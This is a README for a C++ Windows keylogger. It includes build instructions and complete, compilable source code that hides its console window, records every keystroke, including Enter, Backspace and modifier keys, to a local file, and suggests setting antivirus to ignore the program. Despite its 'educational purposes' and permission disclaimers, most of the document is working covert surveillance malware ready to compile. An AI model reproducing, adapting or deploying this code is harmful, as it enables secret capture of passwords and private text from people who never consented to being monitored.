KeyLogger C++ README
Overview
KeyLogger C++ is a basic keylogging application implemented in C++ for Windows. It captures and logs keystrokes into a file named keylogger.txt. This project is intended for educational purposes to help understand how keylogging works. Unauthorized use of keyloggers is illegal and unethical.

Features
Logs keystrokes to keylogger.txt.
Handles special keys such as Space, Enter, Backspace, Caps Lock, Shift, Tab, Control, and Alt.
Hides the console window to run in the background.
Prerequisites
A C++ compiler supporting C++11 or later (e.g., Microsoft Visual Studio, MinGW).
Windows operating system.
Building the Application
Using Microsoft Visual Studio
Open Visual Studio and create a new project:

Select File -> New -> Project.
Choose Empty Project under the Visual C++ category and name it KeyLogger.
Add Source File:

Right-click on the Source Files folder in the Solution Explorer.
Select Add -> New Item.
Choose C++ File (.cpp) and name it main.cpp.
Copy and Paste the Code:

Open main.cpp and paste the code provided below into the file.
Build the Project:

Select Build -> Build Solution from the menu.
Using MinGW
Install MinGW and ensure it’s added to your system’s PATH.

Save the Code:

Create a file named main.cpp and paste the code provided below.
Compile the Code:

Open a command prompt and navigate to the directory containing main.cpp.
Run the command:
sh
Copy code
g++ -o KeyLogger main.cpp -lgdi32
Running the Application
After building the project, you’ll have an executable file named KeyLogger.exe.
Run the executable from the command prompt or by double-clicking it.
Code Example
cpp
Copy code
#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>

#define LOG_FILE "keylogger.txt"

void saveData(const std::string& data) {
    std::ofstream logfile(LOG_FILE, std::ios::app);

    if (logfile.is_open()) {
        logfile << data;
        logfile.close();
    } else {
        std::cerr << "Error opening log file." << std::endl;
    }
}

std::string translateSpecialKey(int key) {
    std::string result;

    switch(key) {
        case VK_SPACE: result = " "; break;
        case VK_RETURN: result = "\n"; break;
        case VK_BACK: result = "\b"; break;
        case VK_CAPITAL: result = "[CAPS_LOCK]"; break;
        case VK_SHIFT: result = "[SHIFT]"; break;
        case VK_TAB: result = "[TAB]"; break;
        case VK_CONTROL: result = "[CTRL]"; break;
        case VK_MENU: result = "[ALT]"; break;
        default: break;
    }

    return result;
}

int main() {
    const int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_BACK, VK_CAPITAL, VK_SHIFT, VK_TAB, VK_CONTROL, VK_MENU};

    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while(true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                bool isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), key) != std::end(specialKeyArray);

                if (isSpecialKey) {
                    std::string specialKeyChar = translateSpecialKey(key);
                    saveData(specialKeyChar);
                } else {
                    if (GetKeyState(VK_CAPITAL)) {
                        saveData(std::string(1, static_cast<char>(key)));
                    } else {
                        saveData(std::string(1, static_cast<char>(std::tolower(key))));
                    }
                }
            }
        }
    }

    return 0;
}
Important Notes
Permissions: Ensure you have explicit permission to use this software on any system. Unauthorized monitoring is illegal and unethical.
Antivirus Software: Some antivirus programs may flag this software. Make sure your antivirus is configured to handle or ignore this application as necessary.
Legal Disclaimer: The use of this keylogger should comply with all applicable laws and regulations. Misuse can result in legal consequences.
License
This project is intended for educational purposes only and is released under the MIT License. See the LICENSE file for more details.

Contact
For questions or issues, please contact Sarath Murukan at sarathmurukansnmimt@gmail.com.

Remember to use this software responsibly and only in environments where you have explicit permission to monitor keystrokes.






